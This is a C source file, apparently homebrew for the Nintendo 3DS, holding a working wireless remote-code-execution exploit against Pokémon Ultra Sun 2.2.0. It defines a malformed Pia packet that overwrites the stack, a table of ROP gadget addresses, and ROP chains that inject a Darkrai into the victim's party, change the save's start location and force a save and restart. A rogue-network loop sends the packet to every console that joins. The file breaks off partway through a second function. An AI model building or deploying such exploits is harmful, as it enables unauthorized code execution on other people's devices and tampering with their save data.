#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <malloc.h>
#include <errno.h>
#include <stdarg.h>
#include <unistd.h>

#include <3ds.h>

void print_constatus()
{
	Result ret=0;
	u32 pos;
	udsConnectionStatus constatus;

	//By checking the output of udsGetConnectionStatus you can check for nodes (including the current one) which just (dis)connected, etc.
	ret = udsGetConnectionStatus(&constatus);
	if(R_FAILED(ret))
	{
		printf("udsGetConnectionStatus() returned 0x%08x.\n", (unsigned int)ret);
	}
	else
	{
		printf("constatus:\nstatus=0x%x\n", (unsigned int)constatus.status);
		printf("1=0x%x\n", (unsigned int)constatus.unk_x4);
		printf("cur_NetworkNodeID=0x%x\n", (unsigned int)constatus.cur_NetworkNodeID);
		printf("unk_xa=0x%x\n", (unsigned int)constatus.unk_xa);
		for(pos=0; pos<(0x20>>2); pos++)printf("%u=0x%x ", (unsigned int)pos+3, (unsigned int)constatus.unk_xc[pos]);
		printf("\ntotal_nodes=0x%x\n", (unsigned int)constatus.total_nodes);
		printf("max_nodes=0x%x\n", (unsigned int)constatus.max_nodes);
		printf("node_bitmask=0x%x\n", (unsigned int)constatus.total_nodes);
	}
}

typedef struct __attribute__((packed)) _PiaUdsPacketHeader {
	u8 unk_0;
	u8 cast; // 1 == allow broadcast nodeId, 2 == unicast (broadcast nodeId not allowed). all others are allowed blindly for some reason?
	u8 unk_2;
	u8 piaNodeId; // 0xFF == broadcast.
	u8 cmd; // 5 == vuln-cmd.
	u8 pad_5;
	u16 length;
	u8 pad_8[0xe - 0x8];
	u16 checksum; // crc16 over rest of header. (polynomial = 0xa001)
} PiaUdsPacketHeader;

typedef struct __attribute__((packed)) _PiaUdsVulnPacket { // "UpdateMigrationNodeInfoMessage"
	PiaUdsPacketHeader header;
	u16 newId; // must not be the same as the original one from the client
	u8 count_writes; // not length checked, number of the following arrays that are filed in. even in bounds we can overwrite 0x60 bytes on the stack.
	u8 unk_13; // this+0x1c gets set to this value before hitting the vuln code
	u8 byte_writes[12];
	u8 index_writes[12];
	union {
		u64 qword_writes[2];
		u32 dword_writes[4];
	};
	u32 rop_chain[360];
} PiaUdsVulnPacket;
_Static_assert(sizeof(PiaUdsVulnPacket) == 1500, "wrong size");

static u16 pia_crc16( const void *data, size_t len )
{
	static const uint16_t table[256] = {
		0x0000, 0xC0C1, 0xC181, 0x0140, 0xC301, 0x03C0, 0x0280, 0xC241,
		0xC601, 0x06C0, 0x0780, 0xC741, 0x0500, 0xC5C1, 0xC481, 0x0440,
		0xCC01, 0x0CC0, 0x0D80, 0xCD41, 0x0F00, 0xCFC1, 0xCE81, 0x0E40,
		0x0A00, 0xCAC1, 0xCB81, 0x0B40, 0xC901, 0x09C0, 0x0880, 0xC841,
		0xD801, 0x18C0, 0x1980, 0xD941, 0x1B00, 0xDBC1, 0xDA81, 0x1A40,
		0x1E00, 0xDEC1, 0xDF81, 0x1F40, 0xDD01, 0x1DC0, 0x1C80, 0xDC41,
		0x1400, 0xD4C1, 0xD581, 0x1540, 0xD701, 0x17C0, 0x1680, 0xD641,
		0xD201, 0x12C0, 0x1380, 0xD341, 0x1100, 0xD1C1, 0xD081, 0x1040,
		0xF001, 0x30C0, 0x3180, 0xF141, 0x3300, 0xF3C1, 0xF281, 0x3240,
		0x3600, 0xF6C1, 0xF781, 0x3740, 0xF501, 0x35C0, 0x3480, 0xF441,
		0x3C00, 0xFCC1, 0xFD81, 0x3D40, 0xFF01, 0x3FC0, 0x3E80, 0xFE41,
		0xFA01, 0x3AC0, 0x3B80, 0xFB41, 0x3900, 0xF9C1, 0xF881, 0x3840,
		0x2800, 0xE8C1, 0xE981, 0x2940, 0xEB01, 0x2BC0, 0x2A80, 0xEA41,
		0xEE01, 0x2EC0, 0x2F80, 0xEF41, 0x2D00, 0xEDC1, 0xEC81, 0x2C40,
		0xE401, 0x24C0, 0x2580, 0xE541, 0x2700, 0xE7C1, 0xE681, 0x2640,
		0x2200, 0xE2C1, 0xE381, 0x2340, 0xE101, 0x21C0, 0x2080, 0xE041,
		0xA001, 0x60C0, 0x6180, 0xA141, 0x6300, 0xA3C1, 0xA281, 0x6240,
		0x6600, 0xA6C1, 0xA781, 0x6740, 0xA501, 0x65C0, 0x6480, 0xA441,
		0x6C00, 0xACC1, 0xAD81, 0x6D40, 0xAF01, 0x6FC0, 0x6E80, 0xAE41,
		0xAA01, 0x6AC0, 0x6B80, 0xAB41, 0x6900, 0xA9C1, 0xA881, 0x6840,
		0x7800, 0xB8C1, 0xB981, 0x7940, 0xBB01, 0x7BC0, 0x7A80, 0xBA41,
		0xBE01, 0x7EC0, 0x7F80, 0xBF41, 0x7D00, 0xBDC1, 0xBC81, 0x7C40,
		0xB401, 0x74C0, 0x7580, 0xB541, 0x7700, 0xB7C1, 0xB681, 0x7640,
		0x7200, 0xB2C1, 0xB381, 0x7340, 0xB101, 0x71C0, 0x7080, 0xB041,
		0x5000, 0x90C1, 0x9181, 0x5140, 0x9301, 0x53C0, 0x5280, 0x9241,
		0x9601, 0x56C0, 0x5780, 0x9741, 0x5500, 0x95C1, 0x9481, 0x5440,
		0x9C01, 0x5CC0, 0x5D80, 0x9D41, 0x5F00, 0x9FC1, 0x9E81, 0x5E40,
		0x5A00, 0x9AC1, 0x9B81, 0x5B40, 0x9901, 0x59C0, 0x5880, 0x9841,
		0x8801, 0x48C0, 0x4980, 0x8941, 0x4B00, 0x8BC1, 0x8A81, 0x4A40,
		0x4E00, 0x8EC1, 0x8F81, 0x4F40, 0x8D01, 0x4DC0, 0x4C80, 0x8C41,
		0x4400, 0x84C1, 0x8581, 0x4540, 0x8701, 0x47C0, 0x4680, 0x8641,
		0x8201, 0x42C0, 0x4380, 0x8341, 0x4100, 0x81C1, 0x8081, 0x4040
	};

	u16 crc = 0;
	
	const u8* buf = (const u8*)data;

	if (len == 0) return crc;
	
	if ((len & 1) != 0) {
		crc = table[*buf];
	} else {
		buf--;
	}
	
	size_t words = len / sizeof(u16);
	while (words != 0) {
		u8 vals[sizeof(u16)] = { buf[1], buf[2] };
		buf += sizeof(u16);
		words--;
		u16 temp = table[(u8)crc ^ vals[0]] ^ (crc >> 8);
		crc = table[(u8)temp ^ vals[1]] ^ (temp >> 8);
	}

	return crc;
}

static Result uds_packet_send_impl(const void* buffer, const u16 length, const u8 nodeId, const size_t attempts) {
	Result result;
	for (size_t i = 0; i < attempts; i++) {
		result = udsSendTo(
			nodeId,
			0xf3,
			UDS_SENDFLAG_Default,
			buffer,
			length
		);
		
		if (R_SUCCEEDED(result) || UDS_CHECK_SENDTO_FATALERROR(result)) break;
	}
	
	return result;
}

static const u8 appdata_game[] = { 1, 0, 0, 0 };

#define ROP_US220_ADD_SP_D0_POP_R4R5R6PC 0x002412c4 // add sp, sp, #0xd0 ; pop {r4,r5,r6,pc}
#define ROP_US220_POP_PC 0x003f3578 // pop {pc} # ROP NOP
#define ROP_US220_MOV_SPR0_MOV_R0R2_MOV_LRR3_BX_R1 0x00137fc0 // mov sp, r0 ; mov r0, r2 ; mov lr, r3 ; bx r1
#define ROP_US220_MOV_LRR3_BX_R1 0x00137fc8 // mov lr, r3 ; bx r1
#define ROP_US220_MOV_R5R0_BLX_R1 0x00221028 // mov r5, r0 ; blx r1
#define ROP_US220_MOV_R2R5_BLX_R3 0x00180f98 // mov r2, r5 ; blx r3
#define ROP_US220_MOV_R4R8_BLX_R1 0x00222d64 // mov r4, r8 ; blx r1
#define ROP_US220_MOV_R8R0_BLX_R1 0x002479ac // mov r8, r0 ; blx r1
#define ROP_US220_POP_R0PC 0x001184d4 // pop {r0, pc}
#define ROP_US220_POP_R1PC 0x002ffd08 // pop {r1, pc}
#define ROP_US220_POP_R3PC 0x00142e98 // pop {r3, pc}
#define ROP_US220_POP_R4PC 0x001045fc // pop {r4, pc}
#define ROP_US220_POP_R1R2R3R12PC 0x00128ac8 // pop {r1, r2, r3, r12, pc}
#define ROP_US220_POP_R2R3R10PC 0x00128cbc // pop {r2, r3, r10, pc}
#define ROP_US220_POP_LRPC 0x0010ef10
#define ROP_US220_MOV_R0SP_BLX_R1 0x001576a8 // mov r0,sp ; blx r1
#define ROP_US220_SUB_R0R0R1_BX_LR 0x0036118c // sub r0, r0, r1 ; bx lr
#define ROP_US220_ADD_R0R0R1_BX_LR 0x0015ad58 // add r0, r0, r1 ; bx lr
#define ROP_US220_ADD_R0R0R2_BX_LR 0x0013a758 // add r0, r0, r2 ; bx lr
#define ROP_US220_UDS_DISCONNECT 0x002619A8 // UDS_DisconnectNetwork+4
#define ROP_US220_RETURNBACK 0x256cb4 //0x258628 // UdsNode::ParseUpdateMigrationInfoMessage prologue

#define ROP_US220_SVC_EXITTHREAD 0x001082A4 // svcExitThread
#define ROP_US220_SVC_EXITPROCESS 0x001044F8 // svcExitProcess
#define ROP_US220_APT_RESTARTAPPLICATION 0x003FA428 // calls apt::RestartApplication(0, 0x300) -- leads eventually to svcExitProcess.

#define ROP_US220_SAVEUTIL_DTOR 0x0047A31C // NetAppLib::Util::NetAppCommonSaveUtility dtor. If byte at this+0x38 != 0, will loop to save the game entirely.

#define ROP_US220_GET_CONNMGR 0x00360C08 // gfl2::base::SingletonAccessor<NetLib::P2P::P2pConnectionManager>::GetInstance(void)
#define ROP_US220_CONNMGR_DISCONNECT 0x003E9A84 // NetLib::P2P::P2pConnectionManager::DisconnectStart(bool)
#define ROP_US220_CONNMGR_TERMINATE 0x3ea864 // NetLib::P2P::P2pConnectionManager::Terminate(void) // should tear-down everything
#define ROP_US220_CONNMGR_INIT 0x3e9270 // NetLib::P2P::P2pConnectionManager::Initialize(NetLib::P2P::ENUM_NIJI_P2P_ID) // bring stuff back up to avoid null-derefs in other thread
#define ROP_US220_CONNMGR_CONNECT 0x3e95c0 // NetLib::P2P::P2pConnectionManager::ConnectStart(gflnet2::p2p::CONNECT_TYPE, unsigned long long)

#define ROP_US220_NEX_CALLCONTEXT_CANCEL 0x0017DE60 // nn::nex::CallContext::Cancel(nn::nex::CallContext::State)

#define ROP_US220_GET_UIVIEWMGR 0x360BD8 // gfl2::base::SingletonAccessor<app::ui::UIViewManager>::GetInstance(void)

#define ROP_US220_GET_FIELDSCRIPT 0x0038DDB8 // Field::FieldScript::FieldScriptSystem::GetInstance(void)

#define ROP_US220_GET_GAMEMGR 0x001048B4 // gfl2::base::SingletonAccessor<GameSys::GameManager>::GetInstance()

#define ROP_US220_LDR_R0R0_BX_LR ROP_US220_GET_CONNMGR + 4 // ldr r0, [r0] ; bx lr
#define ROP_US220_LDRB_R0R0_BX_LR 0x0013f3f0 // ldrb r0, [r0] ; bx lr
#define ROP_US220_LDRH_R0R0_BX_LR 0x002b9a5c // ldrh r0, [r0] ; bx lr
#define ROP_US220_LDR_R1R1_BLX_R2 0x0028f054 // ldr r1, [r1] ; blx r2
#define ROP_US220_STR_R1R0_BX_LR 0x00107bdc // str r1, [r0] ; bx lr
#define ROP_US220_STR_R0R1_BX_LR 0x00105eb4 // str r0, [r1] ; bx lr
#define ROP_US220_STR_R0R2_BX_LR 0x002cecc0 // str r0, [r2] ; bx lr
#define ROP_US220_STRB_R1R0_BX_LR 0x0016f974 // strb r1, [r0] ; bx lr
#define ROP_US220_LDR_R2R0_POP_R4_MOV_R0R2_BX_LR 0x004a576c // ldr r2, [r0] ; pop {r4} ; mov r0, r2 ; bx lr
#define ROP_US220_ADD_R0R210_BX_LR 0x0028ecc8 // add r0, r2, #0x10 ; bx lr
#define ROP_US220_ADD_SP_24_POP_R4R5PC 0x0017b840 // add sp, sp, #0x24 ; pop {r4, r5, pc}
#define ROP_US220_ADD_SP_40_POP_R4PC 0x002ef474 // add sp, sp, #0x40 ; pop {r4, pc}

#define ROP_US220_G_PIA_ADAPTER 0x6925DC
#define ROP_US220_PIA_ADAPTER_TERMINATE 0x40A268
#define ROP_US220_P2P_DESTROY_NETZ 0x41720C
#define ROP_US220_P2P_INIT 0x41723C

#define ROP_US220_G_GAMEMGR 0x6A59C4
#define ROP_US220_G_FIELDSCRIPT 0x6713DC

#define ROP_US220_G_NEX_ALLOC 0x67B14C
#define ROP_US220_G_NEX_FREE 0x67B150

#define ROP_US220_G_UNUSED32 0x669000 // start of .data looks unused, we can stash a pointer there

#define ROP_US220_WARP_ID_SET 0x383B60
#define ROP_US220_MAP_CHANGE 0x382518
#define ROP_US220_CALL_SCRIPT 0x393B6C
#define ROP_US220_GET_ZYGARDE 0x3878d0

#define ROP_US220_GET_HEAP_BY_HEAPID 0x107374 // gfl2::heap::Manager::GetHeapByHeapId(int idx)
#define ROP_US220_ALLOC_BY_HEAP 0x105500 // operator new(size_t length, heap*)
#define ROP_US220_POKEMON_CTOR 0x32070c // pml::pokepara::PokemonParam::PokemonParam(heap*, int idx, u16 level, u64 id)
#define ROP_US220_POKEMON_PARTY_ADD 0x327b60 // pml::PokeParty::AddMember(pml::pokepara::PokemonParam const&)
#define ROP_US220_POKEMON_PARTY_REPLACE 0x0032751C // pml::PokeParty::ReplaceMember(unsigned int, pml::pokepara::PokemonParam const&)
#define ROP_US220_GET_OTDATA 0x4c6fac
#define ROP_US220_POKEMON_SET_OTID 0x322DAC
#define ROP_US220_POKEMON_SET_OTNAME 0x3249E0
#define ROP_US220_POKEMON_SET_OTGENDER 0x00323830
#define ROP_US220_POKEMON_SET_CARTVER 0x32276C
#define ROP_US220_POKEMON_ENSURE_OTDATA 0x32513C

#define ROP_US220_ADD_R1R1R0_MOV_R0R1_BX_LR 0x00335678 // add r1, r1, r0 ; mov r0, r1 ; bx lr

#define ROP_US220_DEBUG_DUMP_R0 ROP_US220_POP_R1PC, 0xdeadbeac, ROP_US220_MOV_SPR0_MOV_R0R2_MOV_LRR3_BX_R1

#define ROP_US220_GET_HEAP_11_IN_R0_AND_R1 \
	ROP_US220_POP_R0PC, \
	11, \
	ROP_US220_GET_HEAP_BY_HEAPID, \
	ROP_US220_POP_LRPC, \
	ROP_US220_POP_PC, \
	ROP_US220_POP_R1PC, \
	0, \
	ROP_US220_ADD_R1R1R0_MOV_R0R1_BX_LR
	
#define ROP_US220_CLONE_POKEMON_BY_SAVED_POINTERS \
	ROP_US220_POP_R0PC, \
	ROP_US220_G_UNUSED32 + 4, \
	ROP_US220_LDR_R0R0_BX_LR, \
	ROP_US220_POP_R2R3R10PC, \
	ROP_US220_POP_PC, \
	0, \
	0, \
	ROP_US220_POP_R1PC, \
	ROP_US220_G_UNUSED32, \
	ROP_US220_LDR_R1R1_BLX_R2, \
	ROP_US220_POP_LRPC, \
	ROP_US220_POP_PC, \
	ROP_US220_POKEMON_PARTY_ADD, \
	ROP_US220_POP_LRPC, \
	ROP_US220_POP_PC


static u32 g_us220_rop_pivot[] = {
	// We can only copy a few u64s by the exploit.
	// Pivot to the rest of the packet contents also on the stack (enough space for a rop chain and 0x400 byte payload)
	0, // r11
	//0xaaaaaaa0,
	//0,
	ROP_US220_ADD_SP_D0_POP_R4R5R6PC,
};

static u32 g_us220_rop_chain_initial[] = {
	0, // r6

	// set the nex alloc() fptr to null so a nex thread doesn't crash by null deref
	ROP_US220_POP_LRPC,
	ROP_US220_POP_PC,
	ROP_US220_POP_R0PC,
	ROP_US220_G_NEX_ALLOC,
	ROP_US220_POP_R1PC,
	0,
	ROP_US220_STR_R1R0_BX_LR,
	
	// do the same for the nex free() fptr to be safe
	ROP_US220_POP_R0PC,
	ROP_US220_G_NEX_FREE,
	ROP_US220_STR_R1R0_BX_LR,
};


static u32 g_us220_rop_chain[] = {
	// use heap 11 for the pokemon, purely because that's what the get_zygarde() function uses
	ROP_US220_GET_HEAP_11_IN_R0_AND_R1,
	ROP_US220_POP_R0PC,
	0x10, // sizeof(pokemon)
	ROP_US220_ALLOC_BY_HEAP,
	ROP_US220_POP_LRPC,
	ROP_US220_POP_PC,
	// r0=pPokemon
	// stash it elsewhere, we need a memory-location
	ROP_US220_POP_R1PC,
	ROP_US220_G_UNUSED32,
	ROP_US220_STR_R0R1_BX_LR,
	// set up registers to call the pokemon ctor.
	// r0 = pPokemon
	// r1 = pHeap
	// r2 = pokemon_idx
	// r3 = level
	// we need to get the heap again which will clobber r0
	ROP_US220_GET_HEAP_11_IN_R0_AND_R1,
	// put pPokemon back in r0
	ROP_US220_POP_R0PC,
	ROP_US220_G_UNUSED32,
	ROP_US220_LDR_R0R0_BX_LR,
	// set up the other registers
	ROP_US220_POP_R2R3R10PC,
	491, // r2(species)=darkrai
	100, // r3(level)
	0, // r10
	// call the ctor
	ROP_US220_POKEMON_CTOR,
	
	ROP_US220_POP_LRPC,
	ROP_US220_POP_PC,
	
	// the created pokemon is not owned by us so won't obey us
	// fix this
	
	// get GameManager
	ROP_US220_GET_GAMEMGR,
	// ->GameData
	ROP_US220_POP_R1PC,
	0x24,
	ROP_US220_ADD_R0R0R1_BX_LR,
	ROP_US220_LDR_R0R0_BX_LR,
	// ->SaveData
	ROP_US220_POP_R1PC,
	0x4,
	ROP_US220_ADD_R0R0R1_BX_LR,
	ROP_US220_LDR_R0R0_BX_LR,
	// &MyStatus
	ROP_US220_POP_R1PC,
	0xEE8,
	ROP_US220_ADD_R0R0R1_BX_LR,
	// put an unused address in r1 to save the OT-data
	ROP_US220_POP_R1PC,
	ROP_US220_G_UNUSED32 + 4,
	ROP_US220_GET_OTDATA,
	
	// and set that OT-data on the new pokemon
	// we need to call several functions for this
	
	// set the cart-version
	ROP_US220_POP_LRPC,
	ROP_US220_POP_PC,
	ROP_US220_POP_R1PC,
	0x20, // note: this is the cart-version for ultra sun
	ROP_US220_POP_R0PC,
	ROP_US220_G_UNUSED32,
	ROP_US220_LDR_R0R0_BX_LR,
	ROP_US220_POKEMON_SET_CARTVER,
	
	// set the ot id
	ROP_US220_POP_LRPC,
	ROP_US220_POP_PC,
	ROP_US220_POP_R0PC,
	ROP_US220_G_UNUSED32 + 4,
	ROP_US220_LDR_R0R0_BX_LR,
	ROP_US220_POP_R1PC,
	0,
	ROP_US220_ADD_R1R1R0_MOV_R0R1_BX_LR,
	ROP_US220_POP_R0PC,
	ROP_US220_G_UNUSED32,
	ROP_US220_LDR_R0R0_BX_LR,
	ROP_US220_POKEMON_SET_OTID,
	
	// set the ot gender
	ROP_US220_POP_LRPC,
	ROP_US220_POP_PC,
	ROP_US220_POP_R0PC,
	ROP_US220_G_UNUSED32 + 4 + 4,
	ROP_US220_LDRB_R0R0_BX_LR,
	ROP_US220_POP_R1PC,
	0,
	ROP_US220_ADD_R1R1R0_MOV_R0R1_BX_LR,
	ROP_US220_POP_R0PC,
	ROP_US220_G_UNUSED32,
	ROP_US220_LDR_R0R0_BX_LR,
	ROP_US220_POKEMON_SET_OTGENDER,
	
	// set the ot name
	ROP_US220_POP_LRPC,
	ROP_US220_POP_PC,
	ROP_US220_POP_R1PC,
	ROP_US220_G_UNUSED32 + 4 + 6,
	ROP_US220_POP_R0PC,
	ROP_US220_G_UNUSED32,
	ROP_US220_LDR_R0R0_BX_LR,
	ROP_US220_POKEMON_SET_OTNAME,
	
	// ensure the OT was set correctly
	ROP_US220_POP_LRPC,
	ROP_US220_POP_PC,
	ROP_US220_POP_R1PC,
	ROP_US220_G_UNUSED32 + 4,
	ROP_US220_POP_R0PC,
	ROP_US220_G_UNUSED32,
	ROP_US220_LDR_R0R0_BX_LR,
	ROP_US220_POKEMON_ENSURE_OTDATA,
	
	ROP_US220_POP_LRPC,
	ROP_US220_POP_PC,
	
	
	// get GameManager
	ROP_US220_GET_GAMEMGR,
	// ->GameData
	ROP_US220_POP_R1PC,
	0x24,
	ROP_US220_ADD_R0R0R1_BX_LR,
	ROP_US220_LDR_R0R0_BX_LR,
	// ->PlayerParty
	ROP_US220_POP_R1PC,
	0xC,
	ROP_US220_ADD_R0R0R1_BX_LR,
	ROP_US220_LDR_R0R0_BX_LR,
	// shove it in an unused address, so we can clone it, we don't need the OT-data anymore so overwrite the start of that
	ROP_US220_POP_R1PC,
	ROP_US220_G_UNUSED32 + 4,
	ROP_US220_STR_R0R1_BX_LR,
	// we have the playerparty in r0, we need to get the pokemon in r1
	ROP_US220_POP_R2R3R10PC,
	ROP_US220_POP_PC,
	0,
	0,
	ROP_US220_POP_R1PC,
	ROP_US220_G_UNUSED32,
	ROP_US220_LDR_R1R1_BLX_R2,
	ROP_US220_POP_LRPC,
	ROP_US220_POP_PC,
	// r0=playerparty, r1=pokemon, call pokemonparty::add
	ROP_US220_POKEMON_PARTY_ADD,
	
	ROP_US220_POP_LRPC,
	ROP_US220_POP_PC,
	
	// clone the pokemon 4 more times to fill the party
	// we only need 2 darkrais to beat the champion, just by using a single move too
	//ROP_US220_CLONE_POKEMON_BY_SAVED_POINTERS,
	//ROP_US220_CLONE_POKEMON_BY_SAVED_POINTERS,
	//ROP_US220_CLONE_POKEMON_BY_SAVED_POINTERS,
	//ROP_US220_CLONE_POKEMON_BY_SAVED_POINTERS,
	
	// replace the party member 0 with the same clone
	ROP_US220_POP_R1PC,
	ROP_US220_POP_PC,
	ROP_US220_POP_R2R3R10PC,
	0,
	ROP_US220_POP_PC,
	0,
	ROP_US220_POP_R0PC,
	ROP_US220_G_UNUSED32,
	ROP_US220_LDR_R0R0_BX_LR,
	ROP_US220_MOV_R5R0_BLX_R1,
	ROP_US220_MOV_R2R5_BLX_R3,
	ROP_US220_POP_LRPC,
	ROP_US220_POP_PC,
	ROP_US220_POP_R0PC,
	ROP_US220_G_UNUSED32 + 4,
	ROP_US220_LDR_R0R0_BX_LR,
	ROP_US220_POP_R1PC,
	0,
	ROP_US220_POKEMON_PARTY_REPLACE,
	ROP_US220_POP_LRPC,
	ROP_US220_POP_PC,
	
	
	
	
	// get GameManager
	ROP_US220_GET_GAMEMGR,
	// ->GameData
	ROP_US220_POP_R1PC,
	0x24,
	ROP_US220_ADD_R0R0R1_BX_LR,
	ROP_US220_LDR_R0R0_BX_LR,
	// &StartLocation
	ROP_US220_POP_R1PC,
	0x60,
	ROP_US220_ADD_R0R0R1_BX_LR,
	
	// set worldID, zoneID (2 * u16)
	ROP_US220_POP_R1PC,
	0x010000bd,
	ROP_US220_STR_R1R0_BX_LR,
};

static u32 g_us220_rop_chain_return[] = {
	ROP_US220_POP_LRPC,
	ROP_US220_POP_PC,
	// forge a NetAppLib::Util::NetAppCommonSaveUtility on the stack, size 0x40 bytes
	// byte at +0x38 must be 1 so the dtor thinks it's in the middle of saving and needs to "complete" it
	ROP_US220_POP_R1PC,
	ROP_US220_ADD_SP_40_POP_R4PC,
	ROP_US220_MOV_R0SP_BLX_R1,
	0,
	0,
	0,
	0,
	0,
	0,
	0,
	0,
	0,
	0,
	0,
	0,
	0,
	0,
	1,
	0,
	0, // r4
	
	// we need a lot of stack space here. +0x200 should be enough.
	ROP_US220_POP_R1PC,
	ROP_US220_POP_PC, // r1
	ROP_US220_POP_R3PC, // r2
	ROP_US220_POP_PC, // r3
	ROP_US220_MOV_R5R0_BLX_R1,
	ROP_US220_MOV_R2R5_BLX_R3,
	// r2=r5=r0 (arg0 after stack pivot)
	// future lr=r3 so set that; return to apt::RestartApplication afterwards
	ROP_US220_POP_R3PC,
	ROP_US220_APT_RESTARTAPPLICATION,
	// r0=stack_pivot so add 0x200 to r0 here
	ROP_US220_POP_R1PC,
	0x200,
	ROP_US220_POP_LRPC,
	ROP_US220_POP_PC,
	ROP_US220_ADD_R0R0R1_BX_LR,
	
	// r1=branch place
	ROP_US220_POP_R1PC,
	ROP_US220_SAVEUTIL_DTOR,
	
	// finish the pivot. call saveutil::dtor() into apt::RestartApplication() with pivoted stack etc etc.
	ROP_US220_MOV_SPR0_MOV_R0R2_MOV_LRR3_BX_R1
};




static void pia_start_evil_network()
{
	Result ret=0;

	u8 data_channel = 0xf3;
	udsNetworkStruct networkstruct;
	udsBindContext bindctx;
	udsConnectionStatus status;
	
	udsNetworkScanInfo *networks = NULL;
	udsNetworkScanInfo *network = NULL;
	size_t total_networks = 0;

	const u32 recv_buffer_size = UDS_DEFAULT_RECVBUFSIZE;
	const u32 wlancommID = 0x164810; // Pokémon Sun (used for all S/M/US/UM)
	const u8 wlansubID = 0x04;
	const char passphrase[] = "GNgBwMcVotYs";

	udsNodeInfo tmpnode;
	char tmpstr[256];
	
	PiaUdsVulnPacket evil = {0};
	evil.header.cast = 1;
	evil.header.piaNodeId = 0xff;
	evil.header.cmd = 5;
	evil.header.length = offsetof(PiaUdsVulnPacket, rop_chain) +
		sizeof(g_us220_rop_chain_initial) + sizeof(g_us220_rop_chain) + sizeof(g_us220_rop_chain_return);
	evil.header.checksum = pia_crc16(&evil.header, offsetof(PiaUdsPacketHeader, checksum));
	
	evil.newId = 0x1337;
	// set up the overwrite and the pivot, chain and payload
	//size_t payload_size = (g_payload_end - g_payload);
	memcpy(evil.dword_writes, g_us220_rop_pivot, sizeof(g_us220_rop_pivot));
	//g_us220_rop_chain[ROP_FIXUP_OFFSET] = sizeof(g_us220_rop_chain) - sizeof(*g_us220_rop_chain);
	memset(evil.rop_chain, 0x41, sizeof(evil.rop_chain));
	_Static_assert(sizeof(evil.rop_chain) >= sizeof(g_us220_rop_chain_initial) + sizeof(g_us220_rop_chain) + sizeof(g_us220_rop_chain_return), "rop chain too large");
	memcpy(evil.rop_chain, g_us220_rop_chain_initial, sizeof(g_us220_rop_chain_initial));
	u8* p8_rop = (u8*)evil.rop_chain;
	size_t offset = sizeof(g_us220_rop_chain_initial);
	memcpy(&p8_rop[offset], g_us220_rop_chain, sizeof(g_us220_rop_chain));
	offset += sizeof(g_us220_rop_chain);
	memcpy(&p8_rop[offset], g_us220_rop_chain_return, sizeof(g_us220_rop_chain_return));
	//memcpy(&p8_rop[offset], g_payload, payload_size);
	//offset += payload_size;
	//memcpy(&p8_rop[offset], g_otherapp_url, sizeof(g_otherapp_url));
	evil.count_writes = sizeof(g_us220_rop_pivot)/sizeof(u64);
	for (int i = 0; i < evil.count_writes; i++) {
		evil.index_writes[i] = (0xb8 / sizeof(u64)) + 1 + i;
	}

	printf("Successfully initialized.\n");
	
	{
		udsGenerateDefaultNetworkStruct(&networkstruct, wlancommID, wlansubID, 2);
		networkstruct.channel = 11; // game freak hardcoded this lol

		printf("Creating the network...\n");
		ret = udsCreateNetwork(&networkstruct, passphrase, sizeof(passphrase), &bindctx, data_channel, recv_buffer_size);
		if(R_FAILED(ret))
		{
			printf("udsCreateNetwork() returned 0x%08x.\n", (unsigned int)ret);
			return;
		}
		
		ret = udsSetApplicationData(appdata_game, sizeof(appdata_game));
		if(R_FAILED(ret))
		{
			printf("udsSetApplicationData() returned 0x%08x.\n", (unsigned int)ret);
			udsDestroyNetwork();
			udsUnbind(&bindctx);
			return;
		}
	}
	
	printf("Waiting for connections, press A to stop.\n");

	while(1)
	{
		gspWaitForVBlank();
		hidScanInput();
		u32 kDown = hidKeysDown();

		if(kDown & KEY_A)break;
		
		// Wait for a connection.
		if (!udsWaitConnectionStatusEvent(false, false)) continue;
		
		// Get the current connection status.
		ret = udsGetConnectionStatus(&status);
		if(R_FAILED(ret))
		{
			printf("udsGetConnectionStatus() returned 0x%08x.\n", (unsigned int)ret);
			continue;
		}
		
		// for each updated node : unk_xa = bitmask of nodes that were updated, since last call.
		// node 0 is the host (us), sending a malformed packet there won't really do much :)
		for (int i = 0; i < UDS_MAXNODES; i++) {
			if ((status.unk_xa & (1 << i)) == 0) continue; // not updated
			
			u16* nodeTable = (u16*)&status.unk_xc;
			u16 node = nodeTable[i];
			if (node == status.cur_NetworkNodeID) continue;
			if (node == 0) continue; // 0 means disconnected
			
			ret = udsGetNodeInformation(node, &tmpnode);//This can be used to get the NodeInfo for a node which just connected, for example.
			if(R_FAILED(ret))
			{
				printf("udsGetNodeInformation(%d) returned 0x%08x.\n", node, (unsigned int)ret);
				continue;
			}
			
			// get the username
			memset(tmpstr, 0, sizeof(tmpstr));

			ret = udsGetNodeInfoUsername(&tmpnode, tmpstr);
			if(R_FAILED(ret))
			{
				strcpy(tmpstr, "<unknown>");
			}
			
			printf("Sending haxx to %s...", tmpstr);
			// send the packet 4 times to try and ensure the node receives it
			for (int time = 0; time < 4; time++) {
			ret = uds_packet_send_impl(&evil, evil.header.length, node, 4);
				if (R_FAILED(ret)) {
					printf("failed:( 0x%08x\n", (unsigned int)ret);
					// try to kick them out
					udsEjectClient(node);
					break;
				}
			}
			// send two packets
			/*for (int i = 0; i < 2; i++) {
				ret = uds_packet_send_impl(&evil, sizeof(evil), node, 4);
				if (R_FAILED(ret)) {
					printf("failed:( 0x%08x\n", (unsigned int)ret);
					// try to kick them out
					udsEjectClient(node);
					break;
				}
			}*/
			if (R_SUCCEEDED(ret)) {
				printf("done\n");
				//udsEjectClient(node);
			}
		}
	}

	udsDestroyNetwork();
	udsUnbind(&bindctx);
}

static void pia_get_app_data() {
		Result ret=0;
	u32 con_type=0;

	u32 *tmpbuf;
	size_t tmpbuf_size;

	u8 data_channel = 1;
	udsNetworkStruct networkstruct;
	udsBindContext bindctx;
	udsNetworkScanInfo *networks = NULL;
	udsNetworkScanInfo *network = NULL;
	size_t total_networks = 0;

	const u32 recv_buffer_size = UDS_DEFAULT_RECVBUFSIZE;
	const u32 wlancommID = 0x164810; // Pokémon Sun (used for all S/M/US/UM)
	const char passphrase[] = "GNgBwMcVotYs";
	
	udsConnectionType conntype = UDSCONTYPE_Client;

	u32 transfer_data, prev_transfer_data = 0;
	size_t actual_size;
	u16 src_NetworkNodeID;
	u32 tmp=0;
	u32 pos;

	udsNodeInfo tmpnode;
	u8 out_appdata[0x300];

	char tmpstr[256];

	printf("Successfully initialized.\n");

	tmpbuf_size = 0x4000;
	tmpbuf = malloc(tmpbuf_size);
	if(tmpbuf==NULL)
	{
		printf("Failed to allocate tmpbuf for beacon data.\n");
		return;
	}

